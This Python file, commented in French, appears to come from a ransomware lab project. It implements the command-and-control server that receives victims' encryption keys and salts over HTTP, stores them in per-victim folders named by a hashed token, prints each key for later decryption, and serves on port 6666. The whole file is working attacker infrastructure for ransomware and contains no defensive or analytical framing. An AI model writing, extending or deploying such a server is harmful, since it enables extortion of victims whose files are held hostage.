import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):

        # Décodage de la donnée
        bin_data = base64.b64decode(data)

        # Chemin du dossier
        path_direcory = os.path.join(CNC.ROOT_PATH, token)
        # Création du dossier 
        os.makedirs(path_direcory, exist_ok=True)
        
        # Chemin du fichier
        path_file = os.path.join(CNC.ROOT_PATH, token, filename)
        # Ecriture du fichier
        with open(path_file, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        
        # Décodage du token
        token = base64.b64decode(body["token"]) 
        # Hashage du token
        hash_token = sha256(token)
        # Transforme le token en string pour le nom du directory
        str_token = hash_token.hexdigest()

        # Sauvegarde de la clé dans le fichier key.bin
        key = body["key"] 
        self.save_b64(str_token, key, "key.bin")

        # Affiche la clé dans la console du CNC pour pouvoir utiliser le decrypt
        print(f"Key : {key}")

        # Sauvegarde du salt dans le fichier salt.bin
        salt = body["salt"] 
        self.save_b64(str_token, salt, "salt.bin")

        return {"status":"OK"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()